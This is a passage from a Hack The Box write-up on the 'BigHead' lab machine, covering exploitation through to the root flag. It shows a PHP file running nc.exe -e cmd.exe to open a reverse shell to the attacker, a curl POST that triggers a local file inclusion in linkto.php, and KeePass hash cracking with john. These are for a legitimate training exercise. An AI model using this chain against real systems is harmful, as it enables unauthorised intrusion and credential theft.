<br> Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to <code class="highlighter-rouge">/testlink</code>. Because everything we have access to on port 5080 is under <code class="highlighter-rouge">/testlink</code>.
<br> On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to <code class="highlighter-rouge">/testlink/linkto.php</code> :
<br><img src="/images/hackthebox/bighead/117.png" alt=""><br>
<br> I went to that path and got an error which disclosed the path of the <code class="highlighter-rouge">php</code> file :
<br><img src="/images/hackthebox/bighead/118.png" alt=""><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Fatal</span> <span class="nx">error</span><span class="o">:</span> <span class="k">require_once</span><span class="p">()</span><span class="o">:</span> <span class="nx">Failed</span> <span class="nx">opening</span> <span class="nx">required</span> <span class="s1">''</span> <span class="p">(</span><span class="nx">include_path</span><span class="o">=</span><span class="err">'</span><span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\php\PEAR</span><span class="p">;</span><span class="o">.</span><span class="p">;</span><span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\apps\testlink\htdocs\lib\functions</span><span class="err">\</span><span class="p">;</span><span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\apps\testlink\htdocs\lib\issuetrackerintegration</span><span class="err">\</span><span class="p">;</span><span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\apps\testlink\htdocs\lib\codetrackerintegration</span><span class="err">\</span><span class="p">;</span><span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration</span><span class="err">\</span><span class="p">;</span><span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\apps\testlink\htdocs\third_party</span><span class="err">\'</span><span class="p">)</span> <span class="nx">in</span> <span class="nx">C</span><span class="o">:</span><span class="nx">\xampp\apps\testlink\htdocs\linkto</span><span class="o">.</span><span class="nx">php</span> <span class="nx">on</span> <span class="nx">line</span> <span class="mi">62</span>
</code></pre></div></div>
<p><br> The path was <code class="highlighter-rouge">C:\xampp\apps\testlink\htdocs\linkto.php</code> So I went there and got the <code class="highlighter-rouge">php</code> file :
<br><img src="/images/hackthebox/bighead/119.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/120.png" alt=""><br></p>
<hr>

<h2 id="lfi-in-linktophp-user-flag">LFI in <code class="highlighter-rouge">linkto.php</code>, User Flag</h2>
<p><br> It’s a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :
<br><img src="/images/hackthebox/bighead/121.png" alt=""><br>
<br> So I checked <code class="highlighter-rouge">pipercoin.php</code> :
<br><img src="/images/hackthebox/bighead/122.png" alt=""><br>
<br> <code class="highlighter-rouge">pipercoin.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--                                                                                                                                        
TODO.. I just added a workaround to the linkto script for now.                                                                              
Nelson.                                                                                                                                     
--&gt;</span>                                                                                                                                         
<span class="cp">&lt;?php</span>                                                                                                                                       
<span class="k">echo</span><span class="p">(</span><span class="s1">'PiperCoinAuth'</span><span class="p">);</span>                                                                                                                      
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br> Nothing interesting, Let’s go back to <code class="highlighter-rouge">linkto.php</code>
<br> I noticed here that we can send a POST request with the parameters <code class="highlighter-rouge">PiperID</code> and <code class="highlighter-rouge">PiperCoinID</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'PiperID'</span><span class="p">])){</span><span class="nv">$PiperCoinAuth</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'PiperCoinID'</span><span class="p">];</span> <span class="c1">//plugins/ppiper/pipercoin.php                                         
</span>        <span class="nv">$PiperCoinSess</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$PiperCoinAuth</span><span class="p">);</span>                                                                                     
        <span class="nv">$PiperCoinAvitar</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$PiperCoinSess</span><span class="p">;}</span>
</code></pre></div></div>
<p><br> <code class="highlighter-rouge">PiperID</code> is not important but <code class="highlighter-rouge">PiperCoinID</code> is. It’s taking the value of <code class="highlighter-rouge">PiperCoinID</code> and assigning it to another variable called <code class="highlighter-rouge">$PiperCoinAuth</code>. After that it’s calling <a href="https://www.php.net/manual/en/function.require-once.php" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">require_once()</code></a> with <code class="highlighter-rouge">$PiperCoinAuth</code>.
<br><img src="/images/hackthebox/bighead/123.png" alt=""><br>
<br> The vulnerability here is obvious. If we can control what’s in <code class="highlighter-rouge">require_once()</code> Then we can make it include any <code class="highlighter-rouge">php</code> file of our choice (Local File Inclusion).
<br> I created a simple <code class="highlighter-rouge">php</code> script to execute <code class="highlighter-rouge">nc.exe</code> and give me a reverse shell :
<br><img src="/images/hackthebox/bighead/124.png" alt=""><br></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">system</span><span class="p">(</span><span class="s1">'C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><br> I uploaded it and uploaded <code class="highlighter-rouge">nc.exe</code> to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp\</code> :
<br><img src="/images/hackthebox/bighead/125.png" alt=""><br>
<br>  Last step is to exploit the vulnerability. We will send a POST request to :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://code.bighead.htb/testlink/linkto.php
</code></pre></div></div>
<p><br> With the parameters <code class="highlighter-rouge">PiperID</code> (we can leave it empty) and <code class="highlighter-rouge">PiperCoinID</code> which will be the path of the <code class="highlighter-rouge">php</code> script :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Nelson\AppData\Local\Temp\rev.php
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -X POST "http://code.bighead.htb/testlink/linkto.php" -d "PiperID=&amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php"
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/126.png" alt=""><br>
<br> We get a reverse shell immediately. As <code class="highlighter-rouge">nt authority\system</code> :
<br><img src="/images/hackthebox/bighead/127.png" alt=""><br>
<br> Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :
<br><img src="/images/hackthebox/bighead/128.png" alt=""><br>
<br> We owned user !
<br></p>
<hr>

<h2 id="alternate-data-stream-in-roottxt">Alternate Data Stream in <code class="highlighter-rouge">root.txt</code>
</h2>
<p><br> Technically we own root now. But we still need to do some more stuff to get the root flag.
<br> I looked in <code class="highlighter-rouge">C:\Users\Administrator\Desktop</code> and the root flag wasn’t there.
<br><img src="/images/hackthebox/bighead/129.png" alt=""><br>
<br> I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but …
<br><img src="/images/hackthebox/bighead/130.png" alt=""><br>
<br> Gilfoyle’s Prayer? Another “Silicon Valley” reference. I terminated the <code class="highlighter-rouge">meterpreter</code> session I had as <code class="highlighter-rouge">Nelson</code> then I went to <code class="highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and executed <code class="highlighter-rouge">m.exe</code> to get another <code class="highlighter-rouge">meterpreter</code> session as <code class="highlighter-rouge">nt authority\system</code>. After that I uploaded <code class="highlighter-rouge">streams.exe</code> to check for alternate data streams on root.txt :
<br><img src="/images/hackthebox/bighead/131.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/132.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/133.png" alt=""><br>
<br><code class="highlighter-rouge">streams C:\Users\Administrator\Desktop\root.txt</code>
<br><img src="/images/hackthebox/bighead/134.png" alt=""><br>
<br> There is an alternate stream called <code class="highlighter-rouge">Zone.Identifier</code>, I tried to read it but <code class="highlighter-rouge">type</code> and <code class="highlighter-rouge">more</code> didn’t work for some reason.
<br><img src="/images/hackthebox/bighead/135.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/136.png" alt=""><br>
<br> After reading <a href="https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/" target="_blank" rel="noopener noreferrer">this article</a> I did it like this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more &lt; "C:\Users\Administrator\Desktop\root.txt:Zone.Identifier"
</code></pre></div></div>
<p><br> And I saved the output to a file and named it <code class="highlighter-rouge">test</code>
<br><img src="/images/hackthebox/bighead/137.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/138.png" alt=""><br>
<br> When I looked at <code class="highlighter-rouge">test</code> I found that it was a binary file :
<br><img src="/images/hackthebox/bighead/139.png" alt=""><br>
<br> So I downloaded it to use <code class="highlighter-rouge">file</code> against it :
<br><img src="/images/hackthebox/bighead/140.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/141.png" alt=""><br>
<br> Keepass password database
<br></p>
<hr>

<h2 id="cracking-the-database-root-flag">Cracking the Database, Root Flag</h2>
<blockquote>
  <p>KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -<a href="https://en.wikipedia.org/wiki/KeePass" target="_blank" rel="noopener noreferrer">Wikipedia</a></p>
</blockquote>

<p><br> I renamed the file to <code class="highlighter-rouge">test.kdbx</code> :
<br><img src="/images/hackthebox/bighead/142.png" alt=""><br>
<br> Then I used <code class="highlighter-rouge">keepass2</code> to open it :
<br><img src="/images/hackthebox/bighead/143.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/144.png" alt=""><br>
<br> And of course we need a password and a key. I went back to the shell and checked the configuration file for <code class="highlighter-rouge">keepass</code> in :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\AppData\Roaming\KeePass
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/145.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/146.png" alt=""><br>
<br> <code class="highlighter-rouge">KeePass.config.xml</code> :</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;Configuration</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;Meta&gt;</span>
		<span class="nt">&lt;PreferUserConfiguration&gt;</span>false<span class="nt">&lt;/PreferUserConfiguration&gt;</span>
		<span class="nt">&lt;OmitItemsWithDefaultValues&gt;</span>true<span class="nt">&lt;/OmitItemsWithDefaultValues&gt;</span>
		<span class="nt">&lt;DpiFactorX&gt;</span>1<span class="nt">&lt;/DpiFactorX&gt;</span>
		<span class="nt">&lt;DpiFactorY&gt;</span>1<span class="nt">&lt;/DpiFactorY&gt;</span>
	<span class="nt">&lt;/Meta&gt;</span>
	<span class="nt">&lt;Application&gt;</span>
		<span class="nt">&lt;LastUsedFile&gt;</span>
			<span class="nt">&lt;Path&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="nt">&lt;/Path&gt;</span>
			<span class="nt">&lt;CredProtMode&gt;</span>Obf<span class="nt">&lt;/CredProtMode&gt;</span>
			<span class="nt">&lt;CredSaveMode&gt;</span>NoSave<span class="nt">&lt;/CredSaveMode&gt;</span>
		<span class="nt">&lt;/LastUsedFile&gt;</span>
		<span class="nt">&lt;MostRecentlyUsed&gt;</span>
			<span class="nt">&lt;MaxItemCount&gt;</span>12<span class="nt">&lt;/MaxItemCount&gt;</span>
			<span class="nt">&lt;Items&gt;</span>
				<span class="nt">&lt;ConnectionInfo&gt;</span>
					<span class="nt">&lt;Path&gt;</span>..\..\Users\Administrator\Desktop\chest.kdbx<span class="nt">&lt;/Path&gt;</span>
					<span class="nt">&lt;CredProtMode&gt;</span>Obf<span class="nt">&lt;/CredProtMode&gt;</span>
					<span class="nt">&lt;CredSaveMode&gt;</span>NoSave<span class="nt">&lt;/CredSaveMode&gt;</span>
				<span class="nt">&lt;/ConnectionInfo&gt;</span>
			<span class="nt">&lt;/Items&gt;</span>
		<span class="nt">&lt;/MostRecentlyUsed&gt;</span>
		<span class="nt">&lt;WorkingDirectories&gt;</span>
			<span class="nt">&lt;Item&gt;</span>Database@..\..\Users\Administrator\Desktop<span class="nt">&lt;/Item&gt;</span>
			<span class="nt">&lt;Item&gt;</span>KeyFile@..\..\Users\Administrator\Desktop<span class="nt">&lt;/Item&gt;</span>
		<span class="nt">&lt;/WorkingDirectories&gt;</span>
		<span class="nt">&lt;Start&gt;</span>
			<span class="nt">&lt;CheckForUpdate&gt;</span>false<span class="nt">&lt;/CheckForUpdate&gt;</span>
			<span class="nt">&lt;CheckForUpdateConfigured&gt;</span>true<span class="nt">&lt;/CheckForUpdateConfigured&gt;</span>
		<span class="nt">&lt;/Start&gt;</span>
		<span class="nt">&lt;FileOpening</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;FileClosing</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;TriggerSystem&gt;</span>
			<span class="nt">&lt;Triggers</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/TriggerSystem&gt;</span>
		<span class="nt">&lt;PluginCompatibility</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/Application&gt;</span>
	<span class="nt">&lt;Logging</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;MainWindow&gt;</span>
		<span class="nt">&lt;X&gt;</span>2<span class="nt">&lt;/X&gt;</span>
		<span class="nt">&lt;Y&gt;</span>2<span class="nt">&lt;/Y&gt;</span>
		<span class="nt">&lt;Width&gt;</span>638<span class="nt">&lt;/Width&gt;</span>
		<span class="nt">&lt;Height&gt;</span>450<span class="nt">&lt;/Height&gt;</span>
		<span class="nt">&lt;SplitterHorizontalFrac&gt;</span>0.8333<span class="nt">&lt;/SplitterHorizontalFrac&gt;</span>
		<span class="nt">&lt;SplitterVerticalFrac&gt;</span>0.25<span class="nt">&lt;/SplitterVerticalFrac&gt;</span>
		<span class="nt">&lt;Layout&gt;</span>Default<span class="nt">&lt;/Layout&gt;</span>
		<span class="nt">&lt;ToolBar</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;EntryView</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;TanView</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;EntryListColumnCollection&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Title<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>UserName<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Password<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
				<span class="nt">&lt;HideWithAsterisks&gt;</span>true<span class="nt">&lt;/HideWithAsterisks&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Url<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
			<span class="nt">&lt;Column&gt;</span>
				<span class="nt">&lt;Type&gt;</span>Notes<span class="nt">&lt;/Type&gt;</span>
				<span class="nt">&lt;Width&gt;</span>90<span class="nt">&lt;/Width&gt;</span>
			<span class="nt">&lt;/Column&gt;</span>
		<span class="nt">&lt;/EntryListColumnCollection&gt;</span>
		<span class="nt">&lt;EntryListColumnDisplayOrder&gt;</span>0 1 2 3 4<span class="nt">&lt;/EntryListColumnDisplayOrder&gt;</span>
		<span class="nt">&lt;ListSorting&gt;</span>
			<span class="nt">&lt;Order&gt;</span>Ascending<span class="nt">&lt;/Order&gt;</span>
		<span class="nt">&lt;/ListSorting&gt;</span>
	<span class="nt">&lt;/MainWindow&gt;</span>
	<span class="nt">&lt;UI&gt;</span>
		<span class="nt">&lt;TrayIcon</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;Hiding</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;StandardFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Microsoft Sans Serif<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/StandardFont&gt;</span>
		<span class="nt">&lt;PasswordFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Courier New<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/PasswordFont&gt;</span>
		<span class="nt">&lt;BannerStyle&gt;</span>WinVistaBlack<span class="nt">&lt;/BannerStyle&gt;</span>
		<span class="nt">&lt;DataEditorFont&gt;</span>
			<span class="nt">&lt;Family&gt;</span>Microsoft Sans Serif<span class="nt">&lt;/Family&gt;</span>
			<span class="nt">&lt;Size&gt;</span>8.25<span class="nt">&lt;/Size&gt;</span>
			<span class="nt">&lt;GraphicsUnit&gt;</span>Point<span class="nt">&lt;/GraphicsUnit&gt;</span>
			<span class="nt">&lt;Style&gt;</span>Regular<span class="nt">&lt;/Style&gt;</span>
			<span class="nt">&lt;OverrideUIDefault&gt;</span>false<span class="nt">&lt;/OverrideUIDefault&gt;</span>
		<span class="nt">&lt;/DataEditorFont&gt;</span>
		<span class="nt">&lt;UIFlags&gt;</span>0<span class="nt">&lt;/UIFlags&gt;</span>
		<span class="nt">&lt;KeyCreationFlags&gt;</span>0<span class="nt">&lt;/KeyCreationFlags&gt;</span>
		<span class="nt">&lt;KeyPromptFlags&gt;</span>0<span class="nt">&lt;/KeyPromptFlags&gt;</span>
	<span class="nt">&lt;/UI&gt;</span>
	<span class="nt">&lt;Security&gt;</span>
		<span class="nt">&lt;WorkspaceLocking&gt;</span>
			<span class="nt">&lt;LockAfterTime&gt;</span>0<span class="nt">&lt;/LockAfterTime&gt;</span>
			<span class="nt">&lt;LockAfterGlobalTime&gt;</span>0<span class="nt">&lt;/LockAfterGlobalTime&gt;</span>
		<span class="nt">&lt;/WorkspaceLocking&gt;</span>
		<span class="nt">&lt;Policy</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;MasterPassword&gt;</span>
			<span class="nt">&lt;MinimumLength&gt;</span>0<span class="nt">&lt;/MinimumLength&gt;</span>
			<span class="nt">&lt;MinimumQuality&gt;</span>0<span class="nt">&lt;/MinimumQuality&gt;</span>
		<span class="nt">&lt;/MasterPassword&gt;</span>
	<span class="nt">&lt;/Security&gt;</span>
	<span class="nt">&lt;Native</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;PasswordGenerator&gt;</span>
		<span class="nt">&lt;AutoGeneratedPasswordsProfile&gt;</span>
			<span class="nt">&lt;GeneratorType&gt;</span>CharSet<span class="nt">&lt;/GeneratorType&gt;</span>
			<span class="nt">&lt;Length&gt;</span>20<span class="nt">&lt;/Length&gt;</span>
			<span class="nt">&lt;CharSetRanges&gt;</span>ULD_______<span class="nt">&lt;/CharSetRanges&gt;</span>
		<span class="nt">&lt;/AutoGeneratedPasswordsProfile&gt;</span>
		<span class="nt">&lt;LastUsedProfile&gt;</span>
			<span class="nt">&lt;GeneratorType&gt;</span>CharSet<span class="nt">&lt;/GeneratorType&gt;</span>
			<span class="nt">&lt;Length&gt;</span>20<span class="nt">&lt;/Length&gt;</span>
			<span class="nt">&lt;CharSetRanges&gt;</span>ULD_______<span class="nt">&lt;/CharSetRanges&gt;</span>
		<span class="nt">&lt;/LastUsedProfile&gt;</span>
		<span class="nt">&lt;UserProfiles</span> <span class="nt">/&gt;</span>
	<span class="nt">&lt;/PasswordGenerator&gt;</span>
	<span class="nt">&lt;Defaults&gt;</span>
		<span class="nt">&lt;OptionsTabIndex&gt;</span>0<span class="nt">&lt;/OptionsTabIndex&gt;</span>
		<span class="nt">&lt;SearchParameters&gt;</span>
			<span class="nt">&lt;ComparisonMode&gt;</span>InvariantCultureIgnoreCase<span class="nt">&lt;/ComparisonMode&gt;</span>
		<span class="nt">&lt;/SearchParameters&gt;</span>
		<span class="nt">&lt;KeySources&gt;</span>
			<span class="nt">&lt;Association&gt;</span>
				<span class="nt">&lt;DatabasePath&gt;</span>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier<span class="nt">&lt;/DatabasePath&gt;</span>
				<span class="nt">&lt;Password&gt;</span>true<span class="nt">&lt;/Password&gt;</span>
				<span class="nt">&lt;KeyFilePath&gt;</span>..\..\Users\Administrator\Pictures\admin.png<span class="nt">&lt;/KeyFilePath&gt;</span>
			<span class="nt">&lt;/Association&gt;</span>
		<span class="nt">&lt;/KeySources&gt;</span>
	<span class="nt">&lt;/Defaults&gt;</span>
	<span class="nt">&lt;Integration&gt;</span>
		<span class="nt">&lt;HotKeyGlobalAutoType&gt;</span>393281<span class="nt">&lt;/HotKeyGlobalAutoType:&gt;</span>
		<span class="nt">&lt;HotKeySelectedAutoType&gt;</span>0<span class="nt">&lt;/HotKeySelectedAutoType&gt;</span>
		<span class="nt">&lt;HotKeyShowWindow&gt;</span>393291<span class="nt">&lt;/HotKeyShowWindow&gt;</span>
		<span class="nt">&lt;HotKeyEntryMenu&gt;</span>0<span class="nt">&lt;/HotKeyEntryMenu&gt;</span>
		<span class="nt">&lt;UrlSchemeOverrides&gt;</span>
			<span class="nt">&lt;BuiltInOverridesEnabled&gt;</span>1<span class="nt">&lt;/BuiltInOverridesEnabled&gt;</span>
			<span class="nt">&lt;CustomOverrides</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;/UrlSchemeOverrides&gt;</span>
		<span class="nt">&lt;AutoTypeAbortOnWindows</span> <span class="nt">/&gt;</span>
		<span class="nt">&lt;ProxyType&gt;</span>System<span class="nt">&lt;/ProxyType&gt;</span>
		<span class="nt">&lt;ProxyAuthType&gt;</span>Auto<span class="nt">&lt;/ProxyAuthType&gt;</span>
	<span class="nt">&lt;/Integration&gt;</span>
	<span class="nt">&lt;Custom</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/Configuration&gt;</span>
</code></pre></div></div>
<p><br> Exactly here :
<br><img src="/images/hackthebox/bighead/147.png" alt=""><br>
<br> The key is <code class="highlighter-rouge">admin.png</code> in <code class="highlighter-rouge">C:\Users\Administrator\Pictures\</code>. Let’s download it :
<br><img src="/images/hackthebox/bighead/148.png" alt=""><br>
<br> admin.png :
<br><img src="/images/hackthebox/bighead/admin.png" alt=""><br>
<br> I wanted to test the key (we still need the password) :
<br><img src="/images/hackthebox/bighead/149.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/150.png" alt=""><br>
<br> I expected <code class="highlighter-rouge">The composite key is invalid</code> but instead of that I got <code class="highlighter-rouge">The file version is unsupported</code>. I tried many other version of <code class="highlighter-rouge">keepass</code> and got the same error. So I was sure that the file itself was corrupted (maybe because of <code class="highlighter-rouge">more</code>). I downloaded it again with <code class="highlighter-rouge">meterpreter</code> itself this time :
<br><img src="/images/hackthebox/bighead/151.png" alt=""><br>
<br> Then I renamed it to <code class="highlighter-rouge">db.kdbx</code> :
<br><img src="/images/hackthebox/bighead/152.png" alt=""><br>
<br> Let’s try again :
<br><img src="/images/hackthebox/bighead/153.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/154.png" alt=""><br>
<br> Perfect ! Now we need the password. I used <code class="highlighter-rouge">keepass2john</code> to put the <code class="highlighter-rouge">kdbx</code> file in a <code class="highlighter-rouge">john</code> crackable format (we need the key to do that (<code class="highlighter-rouge">admin.png</code>))
<br><code class="highlighter-rouge">keepass2john -k admin.png &gt; db.john</code>
<br><img src="/images/hackthebox/bighead/155.png" alt=""><br>
<br> Then I used <code class="highlighter-rouge">john</code> with <code class="highlighter-rouge">rockyou.txt</code> to crack it :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlists/rockyou.txt db.john
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/156.png" alt=""><br>
<br> The password is <code class="highlighter-rouge">darkness</code>. Let’s try to open the database :
<br><img src="/images/hackthebox/bighead/157.png" alt=""><br>
<br><img src="/images/hackthebox/bighead/158.png" alt=""><br>
<br> Great ! double-click on <code class="highlighter-rouge">root.txt</code> and it will copy the flag into our clipboard :
<br><img src="/images/hackthebox/bighead/159.png" alt=""><br>
<br> Let’s paste it :
<br><img src="/images/hackthebox/bighead/160.png" alt=""><br>
<br> And finally we can say … We owned root !
<br>
<br>
<br> That’s it , Feedback is appreciated !
<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/irked/">Hack The Box - Irked</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/lightweight/">Hack The Box - Lightweight</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/bitlab/">
            Hack The Box - Bitlab
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/craft/">
            Hack The Box - Craft
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/smasher2/">
            Hack The Box - Smasher2
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/postgresql/" class="set-1">postgresql</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
